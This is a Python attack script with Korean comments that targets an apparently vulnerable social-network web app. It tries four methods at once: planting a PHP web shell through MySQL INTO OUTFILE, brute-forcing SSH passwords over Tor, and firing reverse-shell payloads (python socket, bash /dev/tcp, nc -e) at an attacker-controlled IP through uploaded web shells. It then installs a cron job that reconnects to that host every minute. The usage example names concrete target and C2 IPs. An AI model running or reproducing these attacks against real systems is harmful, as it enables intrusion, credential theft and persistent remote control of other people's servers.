#!/usr/bin/env python3
"""
모든 방법 동시 시도
- DB 접근 → 웹쉘 생성
- SSH 브루트포스
- 웹쉘 실행
- Cron Job
"""

import requests
import sys
import time
import base64
import urllib.parse
import subprocess
import threading

def method_db_webshell(target_ip, db_host, db_user, db_pass):
    """방법 1: DB로 직접 웹쉘 쓰기"""
    print("\n[방법 1] DB → 웹쉘 생성")
    print("="*60)

    try:
        import pymysql

        print(f"[*] DB 연결 시도: {db_host}")
        conn = pymysql.connect(
            host=db_host,
            user=db_user,
            password=db_pass,
            database='vulnerable_sns',
            connect_timeout=10
        )

        print(f"[+] ✅ DB 연결 성공!")

        cursor = conn.cursor()

        # 웹쉘 코드
        webshell = '<?php system($_GET["x"]); ?>'

        # INTO OUTFILE로 웹쉘 생성
        webshell_paths = [
            '/var/www/html/uploads/db_shell.php',
            '/var/www/html/db_shell.php',
            '/tmp/db_shell.php',
        ]

        for path in webshell_paths:
            try:
                sql = f"SELECT '{webshell}' INTO OUTFILE '{path}'"
                cursor.execute(sql)
                conn.commit()

                print(f"[+] ✅✅✅ 웹쉘 생성 성공: {path}")
                print(f"[*] 접속: http://{target_ip}/uploads/db_shell.php?x=id")

                return path

            except Exception as e:
                print(f"[-] {path}: {str(e)[:50]}")

        cursor.close()
        conn.close()

    except ImportError:
        print(f"[-] pymysql 없음. 설치: pip3 install pymysql")
    except Exception as e:
        print(f"[-] DB 연결 실패: {str(e)[:100]}")

    return None

def method_ssh_bruteforce(target_ip, users):
    """방법 2: SSH 브루트포스"""
    print("\n[방법 2] SSH 브루트포스")
    print("="*60)

    passwords = [
        'alice2024',
        'alice',
        'password',
        'admin',
        '123456',
        'ubuntu',
        'ec2-user',
        'root',
        target_ip.split('.')[-1],  # IP 마지막 숫자
    ]

    print(f"[*] 사용자: {', '.join(users)}")
    print(f"[*] 비밀번호: {len(passwords)}개\n")

    for user in users:
        for password in passwords:
            try:
                # SSH 시도 (Tor 통해)
                cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o ProxyCommand='nc -x 127.0.0.1:9050 %h %p' {user}@{target_ip} 'whoami' 2>/dev/null"

                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)

                if result.returncode == 0:
                    print(f"[+] ✅✅✅ SSH 성공: {user}:{password}")
                    print(f"[*] 접속:")
                    print(f"    ssh {user}@{target_ip}")
                    return (user, password)

            except:
                pass

            print(f"[-] {user}:{password[:10]}...", end='\r')

    print(f"\n[-] SSH 브루트포스 실패")
    return None

def method_webshell_execute(target_ip, attacker_ip, attacker_port):
    """방법 3: 기존 웹쉘 실행"""
    print("\n[방법 3] 웹쉘 실행 (모든 조합)")
    print("="*60)

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    base_url = f"http://{target_ip}"

    # alice 로그인
    data = {'username': 'alice', 'password': 'alice2024'}
    session.post(f"{base_url}/login.php", data=data, allow_redirects=True, timeout=10)
    print("[+] alice 로그인\n")

    webshells = [
        "shell_4727.php",
        "photo.php.jpg",
        "avatar_4727.jpg",
        "db_shell.php",  # DB로 생성한 것
    ]

    # 리버스 쉘들
    payloads = [
        f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
        f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1",
        f"nc {attacker_ip} {attacker_port} -e /bin/bash",
    ]

    print(f"[*] 조합: {len(webshells)} shells × {len(payloads)} payloads\n")

    for shell in webshells:
        for i, payload in enumerate(payloads, 1):
            print(f"[*] {shell} + payload #{i}")

            bg_payload = payload + " &"

            try:
                url = f"{base_url}/file.php?name=uploads/{shell}&cmd={urllib.parse.quote(bg_payload)}"

                resp = session.get(url, timeout=5)

                if resp.status_code == 200:
                    print(f"    [+] 200 OK")

            except requests.exceptions.Timeout:
                print(f"    [+] 타임아웃 (성공 가능성!)")
            except:
                print(f"    [-] 실패")

            time.sleep(2)  # 짧은 딜레이

def method_cron_persistence(target_ip, attacker_ip, attacker_port):
    """방법 4: Cron Job Persistence"""
    print("\n[방법 4] Cron Job (자동 재연결)")
    print("="*60)

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    base_url = f"http://{target_ip}"

    # alice 로그인
    data = {'username': 'alice', 'password': 'alice2024'}
    session.post(f"{base_url}/login.php", data=data, allow_redirects=True, timeout=10)

    cron_cmd = f"(crontab -l 2>/dev/null; echo '* * * * * bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1') | crontab -"

    try:
        url = f"{base_url}/file.php?name=uploads/shell_4727.php&cmd={urllib.parse.quote(cron_cmd)}"

        resp = session.get(url, timeout=10)

        if resp.status_code == 200:
            print(f"[+] ✅ Cron Job 등록 완료!")
            print(f"[*] 1분마다 자동 재연결")

    except Exception as e:
        print(f"[-] 실패: {str(e)[:50]}")

def main():
    if len(sys.argv) < 4:
        print("사용법: python3 102_all_methods.py <TARGET> <ATTACKER_IP> <PORT>")
        print("예시: python3 102_all_methods.py 43.201.154.142 57.181.28.7 4444")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

    print("="*60)
    print("모든 방법 동시 시도")
    print("="*60)
    print(f"타겟: {target_ip}")
    print(f"C2: {attacker_ip}:{attacker_port}")
    print(f"\n[!] C2 리스너 시작:")
    print(f"    nc -lvnp {attacker_port}\n")

    # DB 정보 (config.php에서 가져온 것으로 가정)
    db_host = target_ip  # 또는 'localhost', RDS 엔드포인트 등
    db_user = input("[?] DB 사용자 (기본: admin): ").strip() or "admin"
    db_pass = input("[?] DB 비밀번호 (기본: admin123): ").strip() or "admin123"

    # 모든 방법 시도
    threads = []

    # 방법 1: DB 웹쉘
    t1 = threading.Thread(target=method_db_webshell, args=(target_ip, db_host, db_user, db_pass))
    t1.start()
    threads.append(t1)

    time.sleep(2)

    # 방법 2: SSH 브루트포스
    ssh_users = ['alice', 'admin', 'ubuntu', 'ec2-user', 'root']
    t2 = threading.Thread(target=method_ssh_bruteforce, args=(target_ip, ssh_users))
    t2.start()
    threads.append(t2)

    time.sleep(2)

    # 방법 3: 웹쉘 실행
    method_webshell_execute(target_ip, attacker_ip, attacker_port)

    time.sleep(5)

    # 방법 4: Cron Job
    method_cron_persistence(target_ip, attacker_ip, attacker_port)

    # 모든 스레드 종료 대기
    for t in threads:
        t.join()

    print(f"\n{'='*60}")
    print(f"[+] 모든 방법 시도 완료!")
    print(f"{'='*60}")
    print(f"\n[!] 확인:")
    print(f"    1. C2 리스너 (nc)")
    print(f"    2. SSH 접속")
    print(f"    3. 웹쉘 (db_shell.php)")
    print(f"    4. 1분 기다리기 (Cron)")

if __name__ == "__main__":
    main()
